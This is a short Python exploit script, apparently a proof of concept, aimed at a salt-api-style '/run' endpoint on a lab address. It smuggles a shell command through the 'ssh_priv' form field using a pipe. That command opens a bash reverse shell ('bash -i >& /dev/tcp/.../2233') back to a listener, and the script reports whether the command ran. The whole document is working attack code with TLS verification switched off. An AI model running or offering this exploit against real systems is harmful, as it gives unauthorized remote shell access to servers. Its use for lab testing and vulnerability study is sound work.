import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用不安全请求的警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


url = 'https://192.168.38.129:8000/run'
order="/bin/bash -c 'bash -i >& /dev/tcp/192.168.38.129/2233 0>&1';"

headers = {
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}

data = {
    'token': '1',
    'client': 'ssh',
    'tgt': '*',
    'fun': 'a',
    'roster': 'whip1ash',
    'ssh_priv': 'a|'+order
}

response = requests.post(url, headers=headers, data=data, verify=False)

if response.status_code==200:
    print(order+"命令执行成功")
else:print(order+"命令执行失败")

